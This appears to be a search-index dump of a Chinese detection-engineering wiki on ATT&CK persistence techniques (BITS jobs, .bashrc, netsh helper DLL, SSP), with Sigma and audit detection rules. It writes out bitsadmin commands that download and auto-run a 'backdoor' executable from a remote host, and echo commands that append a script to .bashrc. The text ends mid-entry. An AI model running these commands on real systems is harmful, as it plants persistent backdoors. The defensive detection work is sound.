<p>\u4ece\u653b\u51fb\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u53ef\u4ee5\u6ee5\u7528\u6b64\u529f\u80fd\uff0c\u4ee5\u4fbf\u5728\u53d7\u611f\u67d3\u7684\u4e3b\u673a\u4e0a\u4e0b\u8f7d\u6709\u6548\u8d1f\u8f7d\uff08\u53ef\u6267\u884c\u6587\u4ef6\uff0cPowerShell\u811a\u672c\uff0cScriptlet\u7b49\uff09\u5e76\u5728\u7ed9\u5b9a\u65f6\u95f4\u6267\u884c\u8fd9\u4e9b\u6587\u4ef6\uff0c\u5728\u7ea2\u961f\u64cd\u4f5c\u4e2d\u53ef\u4ee5\u7528\u4f5c\u4fdd\u6301\u6301\u4e45\u6027\u3002\u4f46\u662f\uff0c\u4e0e\u201cbitsadmin\u201d\u8fdb\u884c\u4ea4\u4e92\u9700\u8981\u7ba1\u7406\u5458\u7ea7\u522b\u7684\u6743\u9650\u3002</p> <p>\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u4f1a\u5c06\u6076\u610f\u6709\u6548\u8d1f\u8f7d\u4ece\u8fdc\u7a0b\u4f4d\u7f6e\u4e0b\u8f7d\u5230\u672c\u5730\u76ee\u5f55\u3002</p> <pre><code>bitsadmin /transfer backdoor /download /priority high http://10.0.2.21/pentestlab.exe C:\\tmp\\pentestlab.exe #\u6ce8\u610f\u6b64\u5904\u4e0b\u8f7d\u5730\u5740\u5fc5\u987b\u662f\u6807\u51c6\u7684HTTP\u534f\u8bae\u3002\n</code></pre> <p>\u8fd8\u6709\u4e00\u4e2aPowerShell cmdlet\u53ef\u4ee5\u6267\u884c\u76f8\u540c\u7684\u4efb\u52a1\u3002</p> <pre><code>Start-BitsTransfer -Source \"http://10.0.2.21/pentestlab.exe\" -Destination \"C:\\tmp\\pentestlab.exe\"\n</code></pre> <p>\u5c06\u6587\u4ef6\u653e\u5165\u78c1\u76d8\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ece\u201cbitsadmin\u201d\u5b9e\u7528\u7a0b\u5e8f\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u6765\u5b9e\u73b0\u6301\u4e45\u6027\u3002\u7528\u6cd5\u975e\u5e38\u7b80\u5355\uff1a</p> <ul> <li>\u5728\u521b\u5efa\u53c2\u6570\u9700\u8981\u4efb\u52a1\u7684\u540d\u79f0</li> </ul> <pre><code>bitsadmin /create backdoor\n</code></pre> <ul> <li>\u8be5addfile\u9700\u8981\u6587\u4ef6\u7684\u8fdc\u7a0b\u4f4d\u7f6e\u548c\u672c\u5730\u8def\u5f84</li> </ul> <pre><code>bitsadmin /addfile backdoor \"http://10.0.2.21/pentestlab.exe\"  \"C:\\tmp\\pentestlab.exe\"\n</code></pre> <ul> <li>\u8be5SetNotifyCmdLine\u5c06\u6267\u884c\u7684\u547d\u4ee4</li> </ul> <pre><code>bitsadmin /SetNotifyCmdLine backdoor C:\\tmp\\pentestlab.exe NUL\n</code></pre> <ul> <li>\u6240\u8ff0SetMinRetryDelay\u5b9a\u4e49\u65f6\u95f4\u56de\u8c03\uff08\u79d2\uff09</li> </ul> <pre><code>bitsadmin /SetMinRetryDelay \"backdoor\" 60\n</code></pre> <ul> <li>\u8be5\u7b80\u5386\u53c2\u6570\u5c06\u8fd0\u884c\u4f4d\u5de5\u4f5c</li> </ul> <pre><code>bitsadmin /resume backdoor\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1197-win-BITS%20Jobs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7/windows BITS\u5e94\u7528\u65e5\u5fd7/Windows sysmon\u65e5\u5fd7</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1197-win-BITS%20Jobs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1197-win-BITS%20Jobs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1197-win-BITS%20Jobs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1197-win-BITS%20Jobs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#sigma","title":"Sigma\u89c4\u5219","text":"<pre><code>title: Bitsadmin Download\nstatus: \u6d4b\u8bd5\u9636\u6bb5\ndescription: \u8bd5\u7528bitsadmin\u8fdb\u884c\u4e0b\u8f7d\u4efb\u52a1\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\ntags:\n    - attack.defense_evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        Eventid:\n            - 4688 #windows \u8fdb\u7a0b\u521b\u5efa\uff0c\u5f53\u7cfb\u7edf\u7248\u672c\u57282012\u4ee5\u4e0a\uff0c\u53ef\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u53ef\u57fa\u4e8e\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u76d1\u63a7\u3002\n            - 1    #sysmon \u8fdb\u7a0b\u521b\u5efa\uff0c\u5f53\u7cfb\u7edf\u4e2d\u90e8\u7f72\u6709sysmon\uff0c\u53ef\u901a\u8fc7sysmon\u4e2d\u7684\u8fdb\u7a0b\u521b\u5efa\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002\n        Image:\n            - '*\\bitsadmin.exe' #\u6b64\u89c4\u5219\u68c0\u6d4b\u4f5c\u7528\u6709\u9650\uff0c\u4e0d\u9488\u5bf9powershelll\u4e0b\u573a\u666f\u505a\u68c0\u6d4b\n        CommandLine:\n            - '* /transfer *'\n    selection2:\n        CommandLine:\n            - '*copy bitsadmin.exe*'\n    condition: selection1 or selection2\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Some legitimate apps use this, but limited.\nlevel: medium\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1197-win-BITS%20Jobs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_6","title":"\u5efa\u8bae","text":"<p>\u5efa\u8bae\u975e\u7cfb\u7edf\u7a0b\u5e8f\u53d1\u8d77\u7684BITS\u4f20\u9001\u4efb\u52a1\u8fdb\u884c\u5206\u6790\u68c0\u6d4b\uff08\u767d\u540d\u5355\u673a\u5236\uff09\u3002</p> <p>BITS\u4f5c\u4e3a\u670d\u52a1\u8fd0\u884c\u3002\u53ef\u4f7f\u7528Sc\u67e5\u8be2\u5b9e\u7528\u7a0b\u5e8f\uff08sc query bits\uff09\u6765\u68c0\u67e5\u5176\u72b6\u6001\u3002\u53ef\u4f7f\u7528BITSAdmin\u5de5\u5177\uff08bitsadmin/list/allusers/verbose\uff09\u679a\u4e3e\u6d3b\u8dc3\u7684BITS\u4efb\u52a1\u3002</p> <p>\u76d1\u63a7BITSAdmin\u5de5\u5177\uff08\u5c24\u5176\u662fTransfer\uff0cCreate\uff0cAddFile\uff0cSetNotifyFlags\uff0cSetNotifyCmdLine\uff0cSetMinRetryDelay\uff0cSetCustomHeaders\u548cResume\u547d\u4ee4\u9009\u9879\uff09\u7684\u4f7f\u7528\u53caWindows\u4e8b\u4ef6\u65e5\u5fd7\u6765\u67e5\u770bBITS\u6d3b\u52a8\u3002\u8fd8\u8981\u8003\u8651\u901a\u8fc7\u89e3\u6790BITS\u4efb\u52a1\u6570\u636e\u5e93\u6765\u8c03\u67e5\u4efb\u52a1\u76f8\u5173\u7684\u66f4\u591a\u8be6\u7ec6\u4fe1\u606f\u3002</p> <p>\u76d1\u63a7\u548c\u5206\u6790BITS\u751f\u6210\u7684\u7f51\u7edc\u6d3b\u52a8\u3002BITS\u4efb\u52a1\u4f7f\u7528HTTP\uff08S\uff09\u548cSMB\u8fdb\u884c\u8fdc\u7a0b\u8fde\u63a5\uff0c\u4ec5\u9650\u4e8e\u521b\u5efa\u7528\u6237\uff0c\u5e76\u4e14\u4ec5\u5728\u8be5\u7528\u6237\u767b\u5f55\u65f6\u624d\u8d77\u4f5c\u7528\uff08\u5373\u4f7f\u7528\u6237\u5c06\u4efb\u52a1\u9644\u52a0\u5230\u670d\u52a1\u8d26\u53f7\uff0c\u6b64\u89c4\u5219\u4e5f\u9002\u7528\uff09\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1197-win-BITS%20Jobs%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>Window\u6743\u9650\u7ef4\u6301\uff08\u516d\uff09</p> <p>BITS Jobs https://www.cnblogs.com/xiaozi/p/11833583.html</p> <p>MITRE-ATT&amp;CK-T1197</p> <p>https://attack.mitre.org/techniques/T1197/</p> <p>MITRE ATT&amp;CK \u653b\u51fb\u77e5\u8bc6\u5e93\uff08\u4f01\u4e1a\uff09\u4e2d\u6587\u7248</p> <p>https://hansight.github.io/#/detail</p> <p>BITS\u6301\u4e45\u5316\u7559\u75d5\u65e5\u5fd7\u6587\u4ef6\u4e0b\u8f7d\u5730\u5740</p> <p>https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES/blob/master/Persistence/persist_bitsadmin_Microsoft-Windows-Bits-Client-Operational.evtx</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-004-linux-.bash_profile%20and%20.bashrc/","title":"T1546-004-linux-.bash_profile\u548c.bashrc","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-004-linux-.bash_profile%20and%20.bashrc/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p><code>~/.bash_profile</code>\u548c.bashrc\u662f\u5728\u65b0shell\u6253\u5f00\u65f6\u6216\u7528\u6237\u767b\u5f55\u65f6\u5728\u7528\u6237\u7684\u4e0a\u4e0b\u6587\u4e2d\u6267\u884c\uff0c\u4ee5\u4fbf\u6b63\u786e\u8bbe\u7f6e\u5176\u73af\u5883\u3002\u4e3a\u767b\u5f55shell\u6267\u884c\uff0c\u5e76\u4e3a\u4ea4\u4e92\u5f0f\u975e\u767b\u5f55shell\u6267\u884c\u3002\u8fd9\u610f\u5473\u7740\u5f53\u7528\u6237\uff08\u901a\u8fc7\u7528\u6237\u540d\u548c\u5bc6\u7801\uff09\u767b\u5f55\u5230\u63a7\u5236\u53f0\uff08\u672c\u5730\u6216\u901a\u8fc7SSH\u7b49\u8fdc\u7a0b\u767b\u5f55\uff09\u65f6\uff0c\u4f1a\u5728\u5c06\u521d\u59cb\u547d\u4ee4\u63d0\u793a\u7b26\u8fd4\u56de\u7ed9\u7528\u6237\u4e4b\u524d\u6267\u884c\u3002\u6bcf\u6b21\u6253\u5f00\u65b0\u7684shell\u65f6\u90fd\u4f1a\u6267\u884c\u3002\u8fd9\u5141\u8bb8\u7528\u6237\u5728\u9700\u8981\u6267\u884c\u67d0\u4e9b\u547d\u4ee4\u65f6\u8fdb\u884c\u66f4\u7ec6\u7c92\u5ea6\u7684\u63a7\u5236\u3002</p> <p>\u8fd9\u4e9b\u6587\u4ef6\u662f\u7531\u672c\u5730\u7528\u6237\u7f16\u5199\u7684\uff0c\u7528\u4e8e\u914d\u7f6e\u81ea\u5df1\u7684\u73af\u5883; \u4f46\u662f\uff0c\u6bcf\u6b21\u7528\u6237\u767b\u5f55\u6216\u6253\u5f00\u65b0\u7684shell\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u8fd9\u4e9b\u6587\u4ef6\u4e2d\u63d2\u5165\u4ee3\u7801\u4ee5\u83b7\u5f97\u6301\u4e45\u6027\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-004-linux-.bash_profile%20and%20.bashrc/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>echo\u201c\uff03{command_to_add}\u201d&gt;&gt;\u301c/ .bashrc</p> <p>echo\u201c\uff03{command_to_add}\u201d&gt;&gt;\u301c/ .bash_profile</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-004-linux-.bash_profile%20and%20.bashrc/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09</p> <p>bash\u5386\u53f2\u8bb0\u5f55</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-004-linux-.bash_profile%20and%20.bashrc/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-004-linux-.bash_profile%20and%20.bashrc/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>linux_audit\u65e5\u5fd7</p> <p>type=SYSCALL msg=audit(1565526007.269:5543): arch=c000003e syscall=59 success=yes exit=0 a0=5637bba2a518 a1=5637bba32968 a2=5637bba30130 a3=fffffffffffff000 items=2 ppid=7724 pid=7725 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=3 comm=\"echo\" exe=\"/usr/bin/echo\" key=\"auditcmd\" type=EXECVE msg=audit(1565526007.269:5543): argc=2 a0=\"echo\" a1=\"/home/icbc/1.sh\" type=CWD msg=audit(1565526007.269:5543): cwd=\"/home/icbc\" ...... type=SYSCALL msg=audit(1565526021.625:5547): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=5610372c7240 a2=441 a3=1b6 items=2 ppid=4356 pid=7726 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=3 comm=\"bash\" exe=\"/usr/bin/bash\" key=\"bashrc_changes\"</p> <p>bash\u5386\u53f2\u8bb0\u5f55</p> <p>icbc@icbc:~$ history</p> <p>100  sudo echo \"/home/icbc/1.sh\"&gt;&gt; ~/.bashrc   101  sudo echo \"/home/icbc/1.sh\"&gt;&gt; ~/.bash_profile</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-004-linux-.bash_profile%20and%20.bashrc/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-004-linux-.bash_profile%20and%20.bashrc/#audit","title":"\u57fa\u4e8eaudit\u68c0\u6d4b","text":"<p>index = linux sourcetype = linux_audit bashrc_changes</p> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\u4f60\u8981\u624b\u52a8\u914d\u7f6e\u81ea\u5df1\u7684\u68c0\u6d4b\u89c4\u5219\uff0c\u5982\u4e0b\uff1a</p> <p>-w /home/user/.bashrc -p wa -k bashrc_changes</p> <p>-w /home/user/.bash_profile -p wa -k bashrc_changes</p> <p>\u6ce8\u610f\uff1a\u6211\u4eec\u9700\u8981\u4e3a\u6bcf\u4e2a\u7528\u6237\u7684bashrc\u548cbash_profile\u6587\u4ef6\u6dfb\u52a0\u5ba1\u6838\u89c4\u5219\u3002\u5728audit\u89c4\u5219\u4e2d\u4e0d\u63a5\u53d7\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u6240\u4ee5\u6211\u4eec\u65e0\u6cd5\u521b\u5efa\u8fd9\u6837\u7684\u76d1\u89c6\u89c4\u5219\uff1a/home/*/.bash_history</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-004-linux-.bash_profile%20and%20.bashrc/#bash","title":"\u57fa\u4e8ebash\u5386\u53f2\u8bb0\u5f55","text":"<p>index=linux sourcetype=bash_history bash_command=\"nano .bashrc\" OR bash_command=\"vi .bashrc\" OR echo .bashrc | table host,user_name,bash_command</p> <p>index=linux sourcetype=bash_history bash_command=\"nano .bashrc_profile\" OR bash_command=\"vi .bashrc_profile\" OR echo .bashrc_profile | table host,user_name,bash_command</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-004-linux-.bash_profile%20and%20.bashrc/#sigma","title":"sigma\u68c0\u6d4b\u89c4\u5219","text":"<pre><code>title: \u7f16\u8f91\u4fee\u6539.bash_profile\u548c.bashrc\nstatus: experimental\ndescription: \u68c0\u6d4b\u7528\u6237\u73af\u5883\u7684\u53d8\u5316\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u8fd9\u4e9b\u6587\u4ef6\u4e2d\u63d2\u5165\u4ee3\u7801\uff0c\u4ee5\u4fbf\u5728\u6bcf\u6b21\u7528\u6237\u767b\u5f55\u6216\u6253\u5f00\u65b0shell\u65f6\u83b7\u5f97\u6301\u4e45\u6027\u3002\nreferences:\n    - 'MITRE Attack technique T1156; .bash_profile and .bashrc. '\ndate: 2019/05/12\ntags:\n    - attack.s0003\n    - attack.t1156\n    - attack.persistence\n    - attack.t1546.004\nauthor: Peter Matkovski\ntranslator: 12306Bro\nlogsource:\n    product: linux\n    service: auditd #auditd \u65e5\u5fd7\ndetection:\n    selection:\n        type: 'PATH' #\u8def\u5f84\n        name:\n            - '/home/*/.bashrc'\n            - '/home/*/.bash_profile'\n            - '/home/*/.profile'\n            - '/etc/profile'\n            - '/etc/shells'\n            - '/etc/bashrc'\n            - '/etc/csh.cshrc'\n            - '/etc/csh.login'\n    condition: selection\nfalsepositives:\n    - Admin or User activity\nlevel: medium\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-004-linux-.bash_profile%20and%20.bashrc/#_6","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1546-004</p> <p>https://attack.mitre.org/techniques/T1546/004/</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-007-win-%E9%80%9A%E8%BF%87netsh%20key%E6%8C%81%E4%B9%85%E5%8C%96/","title":"T1546-007-win-\u901a\u8fc7netsh key\u6301\u4e45\u5316","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-007-win-%E9%80%9A%E8%BF%87netsh%20key%E6%8C%81%E4%B9%85%E5%8C%96/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6267\u884cNetsh Helper DLL\u89e6\u53d1\u7684\u6076\u610f\u5185\u5bb9\u6765\u5efa\u7acb\u6301\u4e45\u6027\u3002Netsh.exe\u662f\u4e00\u4e2a\u7ba1\u7406\u5458\u53ef\u4ee5\u7528\u6765\u5728\u547d\u4ee4\u63d0\u793a\u7b26\u5904\u914d\u7f6e\u5e76\u76d1\u89c6\u57fa\u4e8eWindows\u7684\u8ba1\u7b97\u673a\u7684\u5de5\u5177\u3002\u4f7f\u7528Netsh.exe\u5de5\u5177\uff0c\u53ef\u4ee5\u5c06\u8f93\u5165\u7684\u4e0a\u4e0b\u6587\u547d\u4ee4\u5b9a\u5411\u5230\u9002\u5f53\u7684\u5e2e\u52a9\u5668\uff0c\u7136\u540e\u5e2e\u52a9\u5668\u5c06\u6267\u884c\u547d\u4ee4\u3002\u5e2e\u52a9\u5668\u662f\u4e2a\u52a8\u6001\u94fe\u63a5\u5e93(.dll)\u6587\u4ef6\uff0c\u5b83\u901a\u8fc7\u63d0\u4f9b\u914d\u7f6e\u3001\u76d1\u89c6\u548c\u652f\u6301\u4e00\u79cd\u6216\u591a\u79cd\u670d\u52a1\u3001\u5b9e\u7528\u5de5\u5177\u6216\u534f\u8bae\uff0c\u6765\u6269\u5c55Netsh.exe\u5de5\u5177\u7684\u529f\u80fd\u3002</p> <p>\u5df2\u6ce8\u518c\u7684netsh.exe\u5e2e\u52a9\u7a0b\u5e8fDLL\u7684\u8def\u5f84\u5728Windows\u6ce8\u518c\u8868HKLM\\SOFTWARE\\Microsoft\\Netsh\u4e2d</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528netsh.exe\u5e2e\u52a9\u7a0b\u5e8fDLL\u4ee5\u6301\u4e45\u7684\u65b9\u5f0f\u89e6\u53d1\u4efb\u610f\u4ee3\u7801\u7684\u6267\u884c\u3002\u8be5\u6267\u884c\u5c06\u5728\u6267\u884cnetsh.exe\u7684\u4efb\u4f55\u65f6\u95f4\u6267\u884c\uff0c\u8be5\u64cd\u4f5c\u53ef\u80fd\u4f1a\u81ea\u52a8\u53d1\u751f\uff0c\u4f7f\u7528\u53e6\u4e00\u79cd\u6301\u4e45\u6027\u6280\u672f\uff0c\u6216\u8005\u5728\u6267\u884cnetsh.exe\u4f5c\u4e3a\u5176\u6b63\u5e38\u529f\u80fd\u7684\u4e00\u90e8\u5206\u7684\u7cfb\u7edf\u4e0a\u5b58\u5728\u5176\u4ed6\u8f6f\u4ef6\uff08\u4f8b\u5982VPN\uff09\u7684\u60c5\u51b5\u4e0b\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-007-win-%E9%80%9A%E8%BF%87netsh%20key%E6%8C%81%E4%B9%85%E5%8C%96/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u5efa\u8bae\u53c2\u8003Bypass\u5e08\u5085\u7684Window\u6743\u9650\u7ef4\u6301\uff08\u5341\uff09\uff1aNetsh Helper DLL</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-007-win-%E9%80%9A%E8%BF%87netsh%20key%E6%8C%81%E4%B9%85%E5%8C%96/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows sysmon\u65e5\u5fd7</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-007-win-%E9%80%9A%E8%BF%87netsh%20key%E6%8C%81%E4%B9%85%E5%8C%96/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u5efa\u8bae\u53c2\u8003Bypass\u5e08\u5085\u7684Window\u6743\u9650\u7ef4\u6301\uff08\u5341\uff09\uff1aNetsh Helper DLL</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-007-win-%E9%80%9A%E8%BF%87netsh%20key%E6%8C%81%E4%B9%85%E5%8C%96/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u5f53\u6267\u884c\u201c \u6dfb\u52a0\u5e2e\u52a9\u7a0b\u5e8f \u201d\u547d\u4ee4\u4ee5\u52a0\u8f7dDLL\u6587\u4ef6\u65f6\uff0c\u5c06\u5728\u4ee5\u4e0b\u4f4d\u7f6e\u521b\u5efa\u6ce8\u518c\u8868\u9879\u3002</p> <pre><code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\NetSh\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-007-win-%E9%80%9A%E8%BF%87netsh%20key%E6%8C%81%E4%B9%85%E5%8C%96/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-007-win-%E9%80%9A%E8%BF%87netsh%20key%E6%8C%81%E4%B9%85%E5%8C%96/#sigma","title":"sigma\u68c0\u6d4b\u89c4\u5219","text":"<pre><code>title: \u901a\u8fc7netsh key\u6301\u4e45\u5316\nstatus: experimental\ndescription: \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528netsh.exe\u5e2e\u52a9\u7a0b\u5e8fDLL\u4ee5\u6301\u4e45\u7684\u65b9\u5f0f\u89e6\u53d1\u4efb\u610f\u4ee3\u7801\u7684\u6267\u884c\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1546.007/T1546.007.md#atomic-test-1---netsh-helper-dll-registration\n    - https://eqllib.readthedocs.io/en/latest/analytics/5f9a71f4-f5ef-4d35-aff8-f67d63d3c896.html\ndate: 2020-11-29\ntags:\n    - attack.t1546-007\nauthor: 12306Br0\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection_registry:\n        EventID: 13 #\u521b\u5efa\u6ce8\u518c\u8868\u503c sysmon\u65e5\u5fd7\n        Registry_path: \"*\\\\Software\\\\Microsoft\\\\NetSh\\\\*\"\n    condition: selection\nlevel: medium\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-007-win-%E9%80%9A%E8%BF%87netsh%20key%E6%8C%81%E4%B9%85%E5%8C%96/#_6","title":"\u5176\u4ed6\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1546-007-win-%E9%80%9A%E8%BF%87netsh%20key%E6%8C%81%E4%B9%85%E5%8C%96/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1546-007</p> <p>https://attack.mitre.org/techniques/T1546/007/</p> <p>Window\u6743\u9650\u7ef4\u6301\uff08\u5341\uff09\uff1aNetsh Helper DLL</p> <p>https://www.cnblogs.com/xiaozi/p/11834533.html</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/","title":"T1547-005-win-SSP\u6743\u9650\u7ef4\u6301","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>Windows SSP\uff08Windows\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u7a0b\u5e8f\uff09\u52a8\u6001\u94fe\u63a5\u5e93\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u52a0\u8f7d\u5230LSA\uff08\u672c\u5730\u5b89\u5168\u673a\u6784\uff09\u8fdb\u7a0b\u4e2d\u3002\u4e00\u65e6\u52a0\u8f7d\u5230LSA\u4e2d\uff0cSSP\u52a8\u6001\u94fe\u63a5\u5e93\u53ef\u4ee5\u8bbf\u95ee\u5b58\u50a8\u5728Windows\u4e2d\u7684\u52a0\u5bc6\u548c\u660e\u6587\u5bc6\u7801\uff0c\u4f8b\u5982\u4efb\u4f55\u767b\u5f55\u7528\u6237\u7684\u57df\u5bc6\u7801\u6216\u667a\u80fd\u5361PIN\u7801\u3002SSP\u914d\u7f6e\u5b58\u50a8\u5728\u4e24\u4e2a\u6ce8\u518c\u8868\u9879\u4e2d\uff1aHKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages\u548cHKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\SecurityPackages\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4fee\u6539\u8fd9\u4e9b\u6ce8\u518c\u8868\u9879\u6765\u6dfb\u52a0\u65b0\u7684SSP\u3002\u8fd9\u4e9bSSP\u5c06\u5728\u4e0b\u6b21\u7cfb\u7edf\u542f\u52a8\u65f6\u52a0\u8f7d\uff0c\u6216\u8005\u5728\u8c03\u7528AddSecurityPackage Windows API\u51fd\u6570\u65f6\u52a0\u8f7d\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>SSP\uff08Security Support Provider\uff09\u662fwindows\u64cd\u4f5c\u7cfb\u7edf\u5b89\u5168\u673a\u5236\u7684\u63d0\u4f9b\u8005\u3002\u7b80\u5355\u7684\u8bf4\uff0cSSP\u5c31\u662fDLL\u6587\u4ef6\uff0c\u4e3b\u8981\u7528\u4e8ewindows\u64cd\u4f5c\u7cfb\u7edf\u7684\u8eab\u4efd\u8ba4\u8bc1\u529f\u80fd\uff0c\u4f8b\u5982NTLM\u3001Kerberos\u3001Negotiate\u3001Secure Channel\uff08Schannel\uff09\u3001Digest\u3001Credential\uff08CredSSP\uff09\u3002</p> <p>SSPI\uff08Security Support Provider 